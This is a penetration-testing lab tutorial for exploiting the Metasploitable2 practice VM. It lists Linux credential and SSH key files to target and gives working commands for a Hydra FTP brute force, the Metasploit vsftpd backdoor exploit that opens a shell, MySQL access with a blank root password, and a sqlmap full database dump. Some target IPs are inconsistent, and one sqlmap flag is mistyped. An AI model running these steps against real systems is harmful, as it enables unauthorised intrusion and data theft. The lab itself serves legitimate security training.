---
title: '4. Lab 4: Exploitation'
updated: 2023-04-23 04:14:00Z
created: 2023-04-22 20:55:19Z
---
# Lab 4: Exploitation

- Exploitation is when we take our enumerated targets and attempt to expose them.
- Please remember to stay in scope and use this information responsibly.

## **Linux Exfiltration Target Files:**
- These are all target files we should keep a lookout for as they hold confidential information that could compromise CIA
	- /etc/passwd
	- /etc/shadow
	- /etc/issue
	- /etc/group
	- /etc/hostname
	- /etc/ssh/ssh_config
	- /etc/ssh/sshd_config
	- /root/.ssh/id_rsa
	- /root/.ssh/authorized_keys
	- /home/user/.ssh/authorized_keys
	- /home/user/.ssh/id_rsa

## Using Hydra to Bruteforce FTP
- Hydra is a credential bruteforcing tool that is included with Kali Linux.
	- Type 'hydra -hh' in your terminal to view Hydra's full functionality:
- **To bruteforce with Hydra,** we will once again use wordlists, but this time we will use a credential list.
	- In your Kali terminal type:
	- hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.1.139 -o /home/user/Documents/hydra_ftp.txt
		- The -C flag tells Hydra that the wordlist we are providing has credentials in a 'username:password' format.
		- The -o flag tells Hydra we want to output the results to a text file called hydra_ftp in our Documents folder
	- **Now that we have some credentials** from Hydra, type the following in your terminal:
		- ftp 192.168.9.239
			- You will be prompted to log in.
			- Let's try some credential we obtained from our bruteforce attack:
			- Username: "user" : Password: "user"
			- Once logged in, use your terminal do perform the following:
				- Check our working directory with "pwd"
				- Check the folders and files with "dir"
				- Move back a directory with "cd .."
				- One more time "cd .."
				- "dir" to view all files and folders again
			- See any files worth exfiltrating? 'cd' into any folders that you think may include those files.
			- Use "get 'filename'" in your terminal to retrieve them to your machine.

## **Exploiting FTP With Metasploit**
- The Metasploit Framework is an extremely powerful tool and is capable of excecuting hundreds of exploits.
- To use the metasploit framework, type **msfconsole** in your terminal.
- If your terminal prompt now shows 'msf6 >', you are ready to use Metasploit.
- Now is where our vulnerability research comes in handy. From Metsploit, perform the following steps:
    - **msf6** > search 'ftp'
        -   To read more about this exploit, check out: [NVD - CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
    - **msf6** > use exploit/unix/ftp/vsftpd_234_backdoor
    - **msf6** > set RHOSTS 192.168.9.239
    - **msf6** > run
- As you can see we now have a command shell opened on Metasploitable through FTP.
- In your terminal, type the following:
	- whoami
	- ifconfig
		- Observe the IP listed for inet addr
	- Use 'dir' to view the file structure
	- 'cd' into a folder to view it's contents
- Type 'exit' to close the connection

## Exploiting MySql Manually
-   To log into MySql, we use the following login template in our terminals:
    -   mysql -h {hostname} -u username -p {databasename}
-   Since we don't have any credentials yet, let's do some research on default MySql creds.
    - Remember from our subdirectory enumeration with gobuster, we found a subdirectory called /phpinfo.
    - Navigate to 192.168.9.239/phpinfo in your web browser of choice.
    - PHP info files can contain a wealth of information pertaining to web servers.
    - If we scroll down a bit, we can see that the mysql default user and password have no values. 
    - Let's find out what those could be.
        - [MySQL - What is the Default Username and Password?](https://dbschema.com/2020/04/21/mysql-default-username-password/#:~:text=The%20default%20user%20for%20MySQL,it%20and%20choose%20another%20one.)
-   Using info from our research, we can try the default credentials for MySql
-   In your terminal type:
    -   mysql -u root -h 192.168.1.103 -p
        -   Here we use the -u flag to specify the username 'root'
        -   Since the default password for MySql is empty, we leave the -p (password) flag empty
-   Using MySQL in the terminal:
    -   From the mysql> prompt:
    -   SHOW DATABASES
        -   "use 'database_name'"
            -   SHOW TABLES
    -   Repeat these steps and practice your sql-fu to see what you can find.

## Exploiting MySql With SqlMap
-   You may have noticed some of the other options for SqlMap in the enumeration step. Now is when we get to use them.
-   In your terminal, type the following:
    -   sqlmap -d "mysql://root:@192.168.9.239:3306/" ---dump-all --output-dir=/home/user/Documents/
    -   This step dumps the contents of the entire database to our machine. Take a look.
- **Once you have finished these steps, please move on to Lab 5**

# PLEASE NOTE
### These labs only scratch the surface of the reconnaissance, enumeration, and exploitation opportunities offered by Metasploitable2. I encourage you to use Kali tools and the leads from your scans to continue practicing if that interests you. If not, you are free to move on to Lab 5.
